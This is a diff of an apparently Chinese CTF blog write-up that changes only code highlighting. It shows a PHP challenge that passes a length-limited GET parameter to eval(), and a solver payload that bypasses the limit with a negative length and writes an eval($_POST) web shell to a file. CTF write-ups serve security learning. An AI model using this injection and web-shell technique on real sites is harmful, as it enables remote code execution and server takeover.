@@ -201,7 +201,7 @@
     <div class="head-info">
       <span class="post-info-item"><i class="iconfont iconcalendar"></i>March 24, 2021</span>
       
-      <span class="post-info-item"><i class="iconfont iconfont-size"></i>808</span>
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>804</span>
     </div>
   </div>
 </section>
@@ -211,7 +211,7 @@
         <p> 这次开开心心参加比赛，难过关掉比赛页面(太cai了)</p>
 <p>讲讲三个方面签到题</p>
 <h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><p>靶机链接：<a target="_blank" rel="noopener" href="http://d9a55425-604b-45a0-8ee4-14b465f2c65a.node1.hackingfor.fun/1b5337d0c8ad813197b506146d8d503d/">http://d9a55425-604b-45a0-8ee4-14b465f2c65a.node1.hackingfor.fun/1b5337d0c8ad813197b506146d8d503d/</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  error_reporting(0);</span><br><span class="line">  highlight_file(__FILE__);</span><br><span class="line">  $nep &#x3D; $_GET[&#39;nep&#39;];</span><br><span class="line">  $len &#x3D; $_GET[&#39;len&#39;];</span><br><span class="line">  if(intval($len)&lt;8 &amp;&amp; strlen($nep)&lt;13)&#123;</span><br><span class="line">    eval(substr($nep,0,$len));</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    die(&#39;too long!&#39;);</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  error_reporting(<span class="hljs-number">0</span>);<br>  highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>  $nep = $_GET[<span class="hljs-string">&#x27;nep&#x27;</span>];<br>  $len = $_GET[<span class="hljs-string">&#x27;len&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(intval($len)&lt;<span class="hljs-number">8</span> &amp;&amp; strlen($nep)&lt;<span class="hljs-number">13</span>)&#123;<br>    <span class="hljs-keyword">eval</span>(substr($nep,<span class="hljs-number">0</span>,$len));<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;too long!&#x27;</span>);<br>  &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>这题是传参，也就是要用语句写出payload</p>
 <p>payload:    ?len=-1&amp;nep=<code>$_GET[1]</code>;1&amp;1=echo &lt;?php eval($_POST[1]);&gt;2.php</p>
